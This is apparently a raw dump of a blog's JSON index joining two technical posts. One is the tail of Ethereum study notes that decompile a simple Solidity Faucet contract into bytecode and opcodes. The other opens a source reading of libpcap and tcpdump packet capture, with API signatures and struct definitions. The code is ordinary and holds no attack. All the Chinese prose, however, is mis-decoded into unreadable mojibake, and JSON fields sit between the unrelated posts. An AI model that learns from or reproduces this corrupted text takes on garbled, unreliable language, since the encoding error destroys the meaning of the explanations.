è¯·æ±‚äºå“åº”ã€å‘å¸ƒä¸è®¢é˜…ã€ç«‹å³è¯»å–ã€‚\nå‡ºäºéšç§è€ƒè™‘ï¼Œå¯ä»¥åœ¨é¢„è¨€æœºä¸Šå­˜å‚¨å“ˆå¸Œè€ŒéåŸå§‹æ•°æ®ã€‚\nå‘å¸ƒä¸è®¢é˜…é¢„æœŸæ”¹å˜çš„æ•°æ®ï¼Œé¢„è¨€æœºè¦ä¹ˆç”±é“¾ä¸Šæ™ºèƒ½åˆçº¦è½®è¯¢(è€—è´¹gas)ï¼Œè¦ä¹ˆç”±é“¾å¤–å®ˆæŠ¤è¿›ç¨‹ç›‘è§†å’Œæ›´æ–°(å®¢æˆ·ç«¯çš„æœ¬åœ°è°ƒç”¨)ã€‚\nåäºŒã€DAPP IPFSã€Swarmã€Whisper\nnpm build\rswarm --bzzapi http://localhost:8500 --recursive --defaultpath dist/index.html up dist/ ENS\n.ethé¡¶çº§åŸŸåã€æ‹å–åŸŸåã€è®¾ç½®å­åŸŸåã€ä½¿ç”¨å…¬å…±è§£æå™¨ã€è§£æSwarm\nåä¸‰ã€EVM åŸºäºæ ˆçš„æ¶æ„\n1 2 3 4 5 6 # opcodes(middle) solc -o BytecodeDir --opcodes Example.sol # detailed(max) solc -o BytecodeDir --asm Example.sol # bin(min) solc -o BytecodeDir --bin Example.sol ä¸ºå°½é‡å‡å°‘åˆ†æéš¾åº¦ï¼Œç¼–å†™äº†æœ€ç®€å•çš„ï¼ˆæ²¡æœ‰æ±‡å…¥çš„å¯ä»¥è¯´æ˜¯é”™è¯¯çš„ï¼‰æ°´é¾™å¤´ä»£ç ï¼Œä½¿ç”¨æœ€æ–°ç‰ˆæœ¬0.8.14ï¼ˆ2022-05-21ï¼‰solcç¼–è¯‘è·å–å­—èŠ‚ç \n1 2 3 4 5 6 7 pragma solidity 0.8.14; contract Faucet { function withdraw(uint withdraw_amount) public { require(withdraw_amount \u0026lt;= 0.1 ether); payable(msg.sender).transfer(withdraw_amount); } } æœ€åˆæƒ³å°è¯•ä½¿ç”¨IDA-evmè¿™ä¸ªIDAæ’ä»¶è¿›è¡Œåˆ†æï¼Œä½†æ˜¯ç”±äºå…¶ä»…æ”¯æŒpython2ï¼Œç®€å•ä¿®å¤ä½¿å…¶æ”¯æŒpython3åå‘ç°å¹¶ä¸èƒ½æ­£å¸¸åç¼–è¯‘å‡ºæµç¨‹å›¾\næœ€åç›´æ¥ä½¿ç”¨remix bytecode\nä»£ç åˆ†ä¸ºä»£ç æ®µå’Œæ•°æ®æ®µï¼Œä»£ç æ®µå®é™…ä¸Šæ˜¯ä¸€ä¸ªä»£ç åŠ è½½å™¨ï¼ŒåŠ è½½æ™ºèƒ½åˆçº¦dataä¸­çš„æ•°æ®ï¼Œå®é™…è¿è¡Œåˆ™æ˜¯å°†æ•°æ®æ®µä¸­æ•°æ®ç§»åˆ°0-lençš„ä½ç½®ï¼Œç„¶åé‡å…¥0å¼€å§‹è¿è¡Œï¼Œæ‰€ä»¥è¿™æ˜¯æ‰€æœ‰åˆçº¦é€šç”¨çš„åŠ è½½å™¨ã€‚\nåˆ†æä¹¦ä¸Šçš„ç‰ˆæœ¬ç¼–è¯‘å™¨(0.6.x)ç”Ÿæˆçš„ä»£ç çš„æ—¶å€™å‘ç°è®¸å¤šæ„šè ¢çš„æŒ‡ä»¤ å¦‚ä¸‹æ‰€ç¤º\n1 2 3 4 5 6 7 8 9 10 11 12 PUSH1 0x0 CALLDATASIZE PUSH29 0x100000... SWAP1 DIV PUSH4 0xffffffff AND DUP1 PUSH4 0x2e1a7d4d EQ PUSH1 0x41 JUMPI è¿™æ®µä»£ç å°±æ˜¯å®ç°ä¸€ä¸ªå‡½æ•°é€‰æ‹©å™¨çš„åŠŸèƒ½ï¼Œå…ˆcalldataload ç„¶åpush29 å† swap è¿™ä¸æ˜¯æµªè´¹gaså—ï¼Œä¸€ä¸ªå–å¯¹åº”å‡½æ•°é€‰æ‹©å™¨çš„ä»£ç è¿™ä¹ˆå¤šæŒ‡ä»¤æœ‰å¾ˆå¤§ä¼˜åŒ–ç©ºé—´ï¼Œç›¸æ¯”èµ·æ¥æœ€æ–°çš„ç¼–è¯‘å™¨ç”Ÿæˆçš„ä»£ç ä½¿ç”¨ä½ç§»SHR(çœ‹äº†ä¸€ä¸‹å­—èŠ‚ç æ˜¯0x1cä¹‹å‰æ˜¯æœªä½¿ç”¨çš„æ‰€ä»¥å¯èƒ½æ˜¯æ–°åŠ çš„æŒ‡ä»¤ åˆçœ‹äº†ä¸€ä¸‹EIP145æå‡ºçš„ åˆ›å»ºæ—¶é—´2017å¹´å¾ˆæ—©äº†)å°±é«˜æ•ˆå¾—å¤š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 { \u0026#34;functionDebugData\u0026#34;: {}, \u0026#34;generatedSources\u0026#34;: [], \u0026#34;linkReferences\u0026#34;: {}, \u0026#34;object\u0026#34;: \u0026#34;608060405234801561001057600080fd5b50610149806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c80632e1a7d4d14610030575b600080fd5b61004a600480360381019061004591906100e6565b61004c565b005b67016345785d8a000081111561006157600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f193505050501580156100a7573d6000803e3d6000fd5b5050565b600080fd5b6000819050919050565b6100c3816100b0565b81146100ce57600080fd5b50565b6000813590506100e0816100ba565b92915050565b6000602082840312156100fc576100fb6100ab565b5b600061010a848285016100d1565b9150509291505056fea2646970667358221220e0ebfbb1f345e32e68dcacf4993ae16a9bd6a65a51698294e6c2094def89962564736f6c634300080e0033\u0026#34;, \u0026#34;opcodes\u0026#34;: \u0026#34;PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x149 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2E1A7D4D EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x45 SWAP2 SWAP1 PUSH2 0xE6 JUMP JUMPDEST PUSH2 0x4C JUMP JUMPDEST STOP JUMPDEST PUSH8 0x16345785D8A0000 DUP2 GT ISZERO PUSH2 0x61 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC DUP3 SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xA7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xC3 DUP2 PUSH2 0xB0 JUMP JUMPDEST DUP2 EQ PUSH2 0xCE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0xE0 DUP2 PUSH2 0xBA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFC JUMPI PUSH2 0xFB PUSH2 0xAB JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x10A DUP5 DUP3 DUP6 ADD PUSH2 0xD1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE0 0xEB 0xFB 0xB1 RETURN GASLIMIT 0xE3 0x2E PUSH9 0xDCACF4993AE16A9BD6 0xA6 GAS MLOAD PUSH10 0x8294E6C2094DEF899625 PUSH5 0x736F6C6343 STOP ADDMOD 0xE STOP CALLER \u0026#34;, \u0026#34;sourceMap\u0026#34;: \u0026#34;25:181:0:-:0;;;;;;;;;;;;;;;;;;;\u0026#34; } .code PUSH 80\tcontract Faucet {\\r\\n funct... PUSH 40\tcontract Faucet {\\r\\n funct... MSTORE contract Faucet {\\r\\n funct... CALLVALUE contract Faucet {\\r\\n funct... DUP1 contract Faucet {\\r\\n funct... ISZERO contract Faucet {\\r\\n funct... PUSH [tag] 1\tcontract Faucet {\\r\\n funct... JUMPI contract Faucet {\\r\\n funct... PUSH 0\tcontract Faucet {\\r\\n funct... DUP1 contract Faucet {\\r\\n funct... REVERT contract Faucet {\\r\\n funct... tag 1\tcontract Faucet {\\r\\n funct... JUMPDEST contract Faucet {\\r\\n funct... POP contract Faucet {\\r\\n funct... PUSH #[$] 0000000000000000000000000000000000000000000000000000000000000000\tcontract Faucet {\\r\\n funct... DUP1 contract Faucet {\\r\\n funct... PUSH [$] 0000000000000000000000000000000000000000000000000000000000000000\tcontract Faucet {\\r\\n funct... PUSH 0\tcontract Faucet {\\r\\n funct... CODECOPY contract Faucet {\\r\\n funct... PUSH 0\tcontract Faucet {\\r\\n funct... RETURN contract Faucet {\\r\\n funct... .data 0: .code PUSH 80\tcontract Faucet {\\r\\n funct... PUSH 40\tcontract Faucet {\\r\\n funct... MSTORE contract Faucet {\\r\\n funct... CALLVALUE contract Faucet {\\r\\n funct... DUP1 contract Faucet {\\r\\n funct... ISZERO contract Faucet {\\r\\n funct... PUSH [tag] 1\tcontract Faucet {\\r\\n funct... JUMPI contract Faucet {\\r\\n funct... PUSH 0\tcontract Faucet {\\r\\n funct... DUP1 contract Faucet {\\r\\n funct... REVERT contract Faucet {\\r\\n funct... tag 1\tcontract Faucet {\\r\\n funct... JUMPDEST contract Faucet {\\r\\n funct... POP contract Faucet {\\r\\n funct... PUSH 4\tcontract Faucet {\\r\\n funct... CALLDATASIZE contract Faucet {\\r\\n funct... LT contract Faucet {\\r\\n funct... PUSH [tag] 2\tcontract Faucet {\\r\\n funct... JUMPI contract Faucet {\\r\\n funct... PUSH 0\tcontract Faucet {\\r\\n funct... CALLDATALOAD contract Faucet {\\r\\n funct... PUSH E0\tcontract Faucet {\\r\\n funct... SHR contract Faucet {\\r\\n funct... DUP1 contract Faucet {\\r\\n funct... PUSH 2E1A7D4D\tcontract Faucet {\\r\\n funct... EQ contract Faucet {\\r\\n funct... PUSH [tag] 3\tcontract Faucet {\\r\\n funct... JUMPI contract Faucet {\\r\\n funct... tag 2\tcontract Faucet {\\r\\n funct... JUMPDEST contract Faucet {\\r\\n funct... PUSH 0\tcontract Faucet {\\r\\n funct... DUP1 contract Faucet {\\r\\n funct... REVERT contract Faucet {\\r\\n funct... tag 3\tfunction withdraw(uint withdra... JUMPDEST function withdraw(uint withdra... PUSH [tag] 4\tfunction withdraw(uint withdra... PUSH 4\tfunction withdraw(uint withdra... DUP1 function withdraw(uint withdra... CALLDATASIZE function withdraw(uint withdra... SUB function withdraw(uint withdra... DUP2 function withdraw(uint withdra... ADD function withdraw(uint withdra... SWAP1 function withdraw(uint withdra... PUSH [tag] 5\tfunction withdraw(uint withdra... SWAP2 function withdraw(uint withdra... SWAP1 function withdraw(uint withdra... PUSH [tag] 6\tfunction withdraw(uint withdra... JUMP function withdraw(uint withdra... tag 5\tfunction withdraw(uint withdra... JUMPDEST function withdraw(uint withdra... PUSH [tag] 7\tfunction withdraw(uint withdra... JUMP function withdraw(uint withdra... tag 4\tfunction withdraw(uint withdra... JUMPDEST function withdraw(uint withdra... STOP function withdraw(uint withdra... tag 7\tfunction withdraw(uint withdra... JUMPDEST function withdraw(uint withdra... PUSH 16345785D8A0000\t0.1 ether DUP2 withdraw_amount GT withdraw_amount \u0026lt;= 0.1 ether ISZERO withdraw_amount \u0026lt;= 0.1 ether PUSH [tag] 9\trequire(withdraw_amount \u0026lt;= 0.1... JUMPI require(withdraw_amount \u0026lt;= 0.1... PUSH 0\trequire(withdraw_amount \u0026lt;= 0.1... DUP1 require(withdraw_amount \u0026lt;= 0.1... REVERT require(withdraw_amount \u0026lt;= 0.1... tag 9\trequire(withdraw_amount \u0026lt;= 0.1... JUMPDEST require(withdraw_amount \u0026lt;= 0.1... CALLER msg.sender PUSH FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\tpayable(msg.sender).transfer AND payable(msg.sender).transfer PUSH 8FC\tpayable(msg.sender).transfer(w... DUP3 withdraw_amount SWAP1 payable(msg.sender).transfer(w... DUP2 payable(msg.sender).transfer(w... ISZERO payable(msg.sender).transfer(w... MUL payable(msg.sender).transfer(w... SWAP1 payable(msg.sender).transfer(w... PUSH 40\tpayable(msg.sender).transfer(w... MLOAD payable(msg.sender).transfer(w... PUSH 0\tpayable(msg.sender).transfer(w... PUSH 40\tpayable(msg.sender).transfer(w... MLOAD payable(msg.sender).transfer(w... DUP1 payable(msg.sender).transfer(w... DUP4 payable(msg.sender).transfer(w... SUB payable(msg.sender).transfer(w... DUP2 payable(msg.sender).transfer(w... DUP6 payable(msg.sender).transfer(w... DUP9 payable(msg.sender).transfer(w... DUP9 payable(msg.sender).transfer(w... CALL payable(msg.sender).transfer(w... SWAP4 payable(msg.sender).transfer(w... POP payable(msg.sender).transfer(w... POP payable(msg.sender).transfer(w... POP payable(msg.sender).transfer(w... POP payable(msg.sender).transfer(w... ISZERO payable(msg.sender).transfer(w... DUP1 payable(msg.sender).transfer(w... ISZERO payable(msg.sender).transfer(w... PUSH [tag] 11\tpayable(msg.sender).transfer(w... JUMPI payable(msg.sender).transfer(w... RETURNDATASIZE payable(msg.sender).transfer(w... PUSH 0\tpayable(msg.sender).transfer(w... DUP1 payable(msg.sender).transfer(w... RETURNDATACOPY payable(msg.sender).transfer(w... RETURNDATASIZE payable(msg.sender).transfer(w... PUSH 0\tpayable(msg.sender).transfer(w... REVERT payable(msg.sender).transfer(w... tag 11\tpayable(msg.sender).transfer(w... JUMPDEST payable(msg.sender).transfer(w... POP payable(msg.sender).transfer(w... POP function withdraw(uint withdra... JUMP function withdraw(uint withdra... tag 13\tpublic {\\r\\n require(with... JUMPDEST public {\\r\\n require(with... PUSH 0\t\\n DUP1 ) REVERT _amount);\\r\\n tag 15\tJUMPDEST PUSH 0\tDUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP tag 16\tJUMPDEST PUSH [tag] 24\tDUP2 PUSH [tag] 15\tJUMP tag 24\tJUMPDEST DUP2 EQ PUSH [tag] 25\tJUMPI PUSH 0\tDUP1 REVERT tag 25\tJUMPDEST POP JUMP tag 17\tJUMPDEST PUSH 0\tDUP2 CALLDATALOAD SWAP1 POP PUSH [tag] 27\tDUP2 PUSH [tag] 16\tJUMP tag 27\tJUMPDEST SWAP3 SWAP2 POP POP JUMP tag 6\tJUMPDEST PUSH 0\tPUSH 20\tDUP3 DUP5 SUB SLT ISZERO PUSH [tag] 29\tJUMPI PUSH [tag] 30\tPUSH [tag] 13\tJUMP tag 30\tJUMPDEST tag 29\tJUMPDEST PUSH 0\tPUSH [tag] 31\tDUP5 DUP3 DUP6 ADD PUSH [tag] 17\tJUMP tag 31\tJUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP .data åå››ã€Consensus PoS(æƒ©ç½šå†…ç”Ÿ å¤±å»Ether) vs PoW(æƒ©ç½šå¤–ç”Ÿ å¤±å»ç”µè´¹)\nEthash:Ethereum PoW:ä¾èµ–å¤§å‹æ•°æ®é›†(ä¸€ä¸ªæœ‰å‘æ— ç¯å›¾ the DAG éš¾åº¦çº¿æ€§å¢é•¿ å¤§å‹éœ€é¢‘ç¹è¯»å–çš„æ•°æ®ç»“æ„ æŠ—ASICæ€§ æ¶ˆè´¹çº§GPU)çš„ç”Ÿæˆå’Œåˆ†æ\nCasper:Ethereum PoS\nReference https://github.com/ethereumbook/ethereumbook https://github.com/OpenZeppelin/ethernaut https://sandbox.eth.build/ https://remix.ethereum.org/ ","description":"","id":16,"section":"posts","tags":["blockchain","ethereum"],"title":"ã€ŠMastering Ethereumã€‹ç¬”è®°åŠEVMå­—èŠ‚ç é€†å‘","uri":"https://ruokeqx.gitee.io/posts/ethereum101/"},{"content":"Begin æœ¬æ–‡èµ·å› æ˜¯æ“ä½œç³»ç»Ÿè¯¾è®¾ä»»åŠ¡æ–°å¢ç³»ç»Ÿè°ƒç”¨ï¼Œå½“æ—¶æƒ³æ³•æ˜¯æ–°å¢ä¸€ä¸ªç½‘ç»œæŠ“åŒ…åŠŸèƒ½çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç±»ä¼¼äºç®€åŒ–ç‰ˆçš„tcpdumpå’Œkernelçš„ç¼åˆï¼Œæ‰€ä»¥å°±å¼€å§‹å°è¯•é˜…è¯»libpcapã€tcpdunmpåŠkernel/netéƒ¨åˆ†æºç ã€‚ç”±äºç³»ç»Ÿä»£ç é‡å¤§ï¼Œç†æ¸…æ¶æ„æœ‰ä¸€å®šéš¾åº¦ï¼Œæ‰€ä»¥ä¸€ç›´æ‹–åˆ°ç°åœ¨æ‰å®Œæˆéƒ¨åˆ†å†…å®¹ã€‚\næœ¬æ–‡libpcapç‰ˆæœ¬:1.10.1(é˜…è¯»æ—¶æœ€æ–°çš„release[2021å¹´12æœˆ])\nkernel5.15.6\næŠ“åŒ…çš„å†å²ä¸»è¦åˆ†æˆä¸¤ä¸ª\nä¸€ä¸ªæ˜¯è¿œå¤ç‰ˆæœ¬socket(PF_INET)+recvfrom() è¿™æ ·éœ€è¦å¤šæ¬¡å†…å­˜æ‹·è´å’Œç³»ç»Ÿè°ƒç”¨ æ•ˆç‡è¾ƒä½\nè¿˜æœ‰ä¸€ä¸ªæ˜¯ç°åœ¨ä½¿ç”¨çš„scoket(PF_PACKET)+memory-mapped å‡å°‘ç³»ç»Ÿè°ƒç”¨å’Œå†…å­˜æ‹·è´ æ•ˆç‡è¾ƒé«˜\nlibpcapå¸¸ç”¨æ¥å£ ä¸€èˆ¬æƒ…å†µä¸‹ä½¿ç”¨libpcapåº“æŠ“åŒ…ä¼šç”¨åˆ°ä¸‹é¢å‡ ä¸ªæ¥å£å‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 // 1.æ‰“å¼€ä¸€ä¸ªç”¨äºæ•è·æ•°æ®çš„ç½‘ç»œæ¥å£ // pcap.c pcap_t\t*pcap_open_live(const char *, int, int, int, char *); /* const char * device\tç½‘ç»œæ¥å£åå­— ä¸ºç¬¬ä¸€æ­¥è·å–çš„ç½‘ç»œæ¥å£å­—ç¬¦ä¸²(pcap_lookupdev()è¿”å›å€¼),å¯äººä¸ºæŒ‡å®š,ä¾‹å¦‚\u0026#34;eth0\u0026#34; int snaplen\tæ•è·æ•°æ®åŒ…é•¿åº¦ int promise æ··æ‚æ¨¡å¼-1 éæ··æ‚æ¨¡å¼-0 int to_ms\téœ€è¦ç­‰å¾…çš„æ¯«ç§’æ•° char *errbuf\tå­˜å‚¨é”™è¯¯ä¿¡æ¯ */ // 2.è·å–æŒ‡å®šç½‘å¡çš„ ip åœ°å€,å­ç½‘æ©ç  // pcap.c int\tpcap_lookupnet(const char *, bpf_u_int32 *, bpf_u_int32 *, char *); /* const char *device\tç½‘ç»œè®¾å¤‡å\tå¯ä»¥äººä¸ºæŒ‡å®šeth0 å¯ä»¥æ˜¯pcap_lookupdev()çš„è¿”å›å€¼ bpf_u_int32 *netp\tå­˜æ”¾ipçš„æŒ‡é’ˆ bpf_u_int32 *maskp\tå­˜æ”¾å­ç½‘æ©ç çš„æŒ‡é’ˆ char *errbuf\tå­˜æ”¾é”™è¯¯ä¿¡æ¯ */ // 3.ç¼–è¯‘BPFè¿‡æ»¤è§„åˆ™ // gencode.c int\tpcap_compile(pcap_t *, struct bpf_program *, const char *, int, bpf_u_int32); /* pcap_t *p\tpcap_open_live()åˆ›å»ºå¹¶è¿”å›çš„ pcap_t ç±»å‹çš„æŒ‡é’ˆ struct bpf_program *fp\tå­˜æ”¾ç¼–è¯‘åçš„BPF pcap_setfilter()éœ€è¦ä¼ å…¥è¿™ä¸ªæŒ‡é’ˆ const char *buf\tè¿‡æ»¤æ¡ä»¶ int optimize\tæ˜¯å¦éœ€è¦ä¼˜åŒ–è¿‡æ»¤è¡¨è¾¾å¼ bpf_u_int32 mask\tæŒ‡å®šæœ¬åœ°ç½‘ç»œçš„ç½‘ç»œæ©ç  */ // 4.è®¾ç½®è¿‡æ»¤è§„åˆ™ // pcap.c int\tpcap_setfilter(pcap_t *, struct bpf_program *); /* pcap_t *p\tpcap_open_live()åˆ›å»ºå¹¶è¿”å›çš„ pcap_t ç±»å‹çš„æŒ‡é’ˆ struct bpf_program *fp\tpcap_compile()ç¼–è¯‘å¥½çš„BPFè¿‡æ»¤è§„åˆ™\t[ç¬¬äºŒä¸ªå‚æ•°] */ // 5.å¾ªç¯æ•è·ç½‘ç»œæ•°æ®åŒ… int\tpcap_loop(pcap_t *, int, pcap_handler, u_char *); /* pcap_t *p\tpcap_open_live()åˆ›å»ºå¹¶è¿”å›çš„ pcap_t ç±»å‹çš„æŒ‡é’ˆ int cnt\tæŒ‡å®šæ•è·æ•°æ®åŒ…ä¸ªæ•° æŠ“åˆ°äº†æŒ‡å®šæ•°ç›®å°±ä¼šç«‹åˆ»è¿”å› -1æ— é™å¾ªç¯æ•è· pcap_handler callback\tå›è°ƒå‡½æ•°,å¤„ç†æ•è·åˆ°çš„æ•°æ®åŒ… u_char *user\tå‘å›è°ƒä¸­ä¼ é€’çš„å‚æ•° typedef void (*pcap_handler)(u_char *, const struct pcap_pkthdr *, const u_char *); u_char * user\tpcap_loop()æœ€åä¸€ä¸ªå‚æ•° const struct pcap_pkthdr *pkthdr\tç»“æ„ä½“æŒ‡é’ˆ pcap_next()å‚æ•°ä¸€è‡´ const u_char * packet\tæ”¶åˆ°çš„æ•°æ®åŒ…æ•°æ® */ // 6.é‡Šæ”¾ç½‘ç»œæ¥å£ void pcap_close(pcap_t *); /* pcap_t *p\tpcap_open_live()åˆ›å»ºå¹¶è¿”å›çš„ pcap_t ç±»å‹çš„æŒ‡é’ˆ */ æŠ“åŒ…æ–¹å¼ socket + recvfrom 1 2 3 sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); len = recvfrom(sock, buffer, BUFFER_MAX, 0, NULL, NULL); buffer Tcpdump 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 int main{ ... pc = pcap_create(device, ebuf); ... status = pcap_activate(pc); ... if (WFileName) { ... if (Cflag != 0 || Gflag != 0) { ... callback = dump_packet_and_trunc; ... }else{ callback = dump_packet; ... } }else{ ... callback = print_packet; ... } ... do{ status = pcap_loop(pd, cnt, callback, pcap_userdata); ... } } ä¾‹ç¨‹-pcap_loop 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 static void ethernet_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) { // ç¨‹åºå¯¹æŠ“åˆ°åŒ…çš„å¤„ç† return; } static void * sniffer_thread_callback(void *param) { pthread_detach(pthread_self()); printf(\u0026#34;sniffer_thread_callback enter\\n\u0026#34;); int nDev =-(TYPE32)param; char errbuf[PCAP_ERRBUF_SIZE]; pcap_t *handle; //bug modify flag jl char *filter_exp = \u0026#34;not broadcast and not arp\u0026#34;; struct bpf_program fp; bpf_u_int32 mask = 0; bpf_u_int32 net = 0; handle = pcap_open_live(option_struct.dev_interface[nDev], 65535, 1, 0, errbuf); if (handle == NULL) { fprintf(stderr, \u0026#34;couldn\u0026#39;t open device %s: %s\\n\u0026#34;, option_struct.dev_interface[nDev], errbuf); pthread_exit(NULL); return NULL; } pcap_lookupnet(option_struct.dev_interface[nDev], \u0026amp;net, \u0026amp;mask, errbuf); if (pcap_datalink(handle) != DLT_EN10MB) { fprintf(stderr, \u0026#34;couldn\u0026#39;t pcap_datalink %s\\n\u0026#34;, pcap_geterr(handle)); pcap_close(handle); pthread_exit(NULL); return NULL; } if (pcap_compile(handle, \u0026amp;fp, filter_exp, 0, net) == -1) { fprintf(stderr, \u0026#34;couldn\u0026#39;t parse filter %s: %s\\n\u0026#34;, filter_exp, pcap_geterr(handle)); pcap_freecode(\u0026amp;fp); pcap_close(handle); pthread_exit(NULL); return NULL; } if (pcap_setfilter(handle, \u0026amp;fp) == -1) { fprintf(stderr, \u0026#34;couldn\u0026#39;t install filter %s: %s\\n\u0026#34;, filter_exp, pcap_geterr(handle)); pcap_freecode(\u0026amp;fp); pcap_close(handle); pthread_exit(NULL); return NULL; } if (pcap_loop(handle, -1, ethernet_packet, (u_char *)\u0026amp;nDev) == -1) { fprintf(stderr, \u0026#34;couldn\u0026#39;t pacp loop %s: %s\\n\u0026#34;, filter_exp, pcap_geterr(handle)); } pcap_freecode(\u0026amp;fp); pcap_close(handle); pthread_exit(NULL); return NULL; } libpcapç»“æ„ä½“ ä½¿ç”¨çš„é‡è¦ç»“æ„ä½“å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 // pcap-int.h struct pcap { read_op_t read_op; // Method to call to read packets on a live capture. next_packet_op_t next_packet_op; // Method to call to read the next packet from a savefile. /* * Read buffer. */ u_int bufsize; void *buffer; u_char *bp; int cc; sig_atomic_t break_loop; /* flag set to force break from packet-reading loop */ void *priv;\t/* private data for methods */ // ... } // pcap-int.h struct pcap_opt { char\t*device; int\ttimeout;\t/* timeout for buffering */ u_int\tbuffer_size; int\tpromisc; int\trfmon;\t/* monitor mode */ int\timmediate;\t/* immediate mode - deliver packets as soon as they arrive */ int\tnonblock;\t/* non-blocking mode - don\u0026#39;t wait for packets to be delivered, return \u0026#34;no packets available\u0026#34; */ int\ttstamp_type; int\ttstamp_precision; // linux int\tprotocol;\t/* protocol to use when creating PF_PACKET socket */ // WIN32 int\tnocapture_local; }; // pcap-linux.c struct pcap_linux { long long sysfs_dropped; /* packets reported dropped by /sys/class/net/{if_name}/statistics/rx_{missed,fifo}_errors */ struct pcap_stat stat; char\t*device;\t/* device name */ int\tfilter_in_userland; /* must filter in userland */ int\tblocks_to_filter_in_userland; int\tmust_do_on_close; /* stuff we must do when we close */ int\ttimeout;\t/* timeout for buffering */ int\tcooked;\t/* using SOCK_DGRAM rather than SOCK_RAW */ int\tifindex;\t/* interface index of device we\u0026#39;re bound to */ int\tlo_ifindex;\t/* interface index of the loopback device */ int\tnetdown;\t/* we got an ENETDOWN and haven\u0026#39;t resolved it */ bpf_u_int32 oldmode;\t/* mode to restore when turning monitor mode off */ char\t*mondevice;\t/* mac80211 monitor device we created */ u_char\t*mmapbuf;\t/* memory-mapped region pointer */ size_t\tmmapbuflen;\t/* size of region */ int\tvlan_offset;\t/* offset at which to insert vlan tags; if -1, don\u0026#39;t insert */ u_int\ttp_version;\t/* version of tpacket_hdr for mmaped ring */ u_int\ttp_hdrlen;\t/* hdrlen of tpacket_hdr for mmaped ring */ u_char\t*oneshot_buffer; /* buffer for copy of packet */ int\tpoll_timeout;\t/* timeout to use in poll() */ #ifdef HAVE_TPACKET3 unsigned char *current_packet; /* Current packet within the TPACKET_V3 block. Move to next block if NULL. */ int packets_left; /* Unhandled packets left within the block from previous call to pcap_read_linux_mmap_v3 in case of TPACKET_V3. */ #endif int poll_breakloop_fd; /* fd to an eventfd to break from blocking operations */ }; // pcap/pcap.h struct pcap_pkthdr { struct timeval ts;\t/* time stamp */ bpf_u_int32 caplen;\t/* length of portion present */ bpf_u_int32 len;\t/* length of this packet (off wire) */ }; pcap_open_live pcap_open_liveç®€ç•¥ä»£ç 